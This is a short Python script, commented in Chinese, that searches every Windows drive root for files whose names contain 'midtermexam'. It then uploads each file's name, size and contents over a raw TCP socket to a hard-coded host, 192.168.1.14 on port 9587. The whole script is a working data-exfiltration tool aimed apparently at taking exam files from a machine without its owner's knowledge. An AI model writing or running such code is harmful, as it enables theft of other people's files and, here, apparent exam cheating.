import os
import re
import socket

# 获取所有盘符
drives = [drive.strip() for drive in os.popen('wmic logicaldisk get caption').readlines() if drive.strip()]

# 创建一个空列表，用于存储找到的文件
exam_file_list = []

# 遍历每个盘符
for drive in drives:
    path = os.path.join(drive, "\\")  # 构造要搜索的目录

    # 使用 os.scandir 函数遍历指定目录中的所有文件
    for entry in os.scandir(path):
        if entry.is_file() and "midtermexam" in entry.name and not entry.name.endswith('.ink'):
            # 如果是，将文件路径添加到列表中
            exam_file_list.append(entry.path)

# 打印找到的所有 "midtermexam" 文件路径
print(exam_file_list)

# 创建一个新的套接字来连接到服务器
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("192.168.1.14", 9587))  # 连接到服务器

# 遍历找到的所有 "midtermexam" 文件
for exam_file in exam_file_list:
    # 获取文件大小
    file_size = os.path.getsize(exam_file)
    print(file_size)
    # 发送文件名和文件大小
    client_socket.sendall(f"{os.path.basename(exam_file)}|{file_size}\n".encode())

    # 使用二进制模式打开文件并读取内容
    with open(exam_file, "rb") as f:
        for data in iter(lambda: f.read(1024), b''):
            # 发送数据
            client_socket.sendall(data)

# 关闭套接字
client_socket.close()
